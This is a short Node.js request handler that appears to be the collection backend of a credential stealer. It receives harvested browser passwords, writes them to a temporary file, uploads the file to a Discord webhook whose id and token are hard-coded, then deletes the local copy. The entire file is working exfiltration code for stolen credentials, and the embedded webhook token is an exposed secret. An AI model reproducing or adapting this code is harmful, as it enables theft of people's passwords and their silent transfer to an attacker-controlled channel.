const { keyToWebhook } = require('../keyToWebhook');
const fs = require('fs');
const { WebhookClient } = require('discord.js');

module.exports = async (req, res) => {
    const { passwords } = req.body
  var keyy = "31"
    let content = !passwords.includes('URL:') ? "Passwords don\'t found." : passwords;
    fs.writeFileSync(`./Src/Temp/mdp_${keyy}.txt`, content);
const webhookClient = new WebhookClient({ id: '1056349734278807592', token: 'RzPxTlSFScGbxST_tZYeZZ8Oc1L5PBvbmblVUt774as2tKfaL9ssXvuG5tsN1et4nqaw' });

  webhookClient.send({
        files: [{
            attachment: `./Src/Temp/mdp_${keyy}.txt`,
            name: "passwords.txt"
        }]
    })
        .then(() => {
            fs.unlink(`./Src/Temp/mdp_${keyy}.txt`, function (err) {
                if (err) { };
            })
            res.sendStatus(200)
            return;
        })
        .catch(err => { })
}
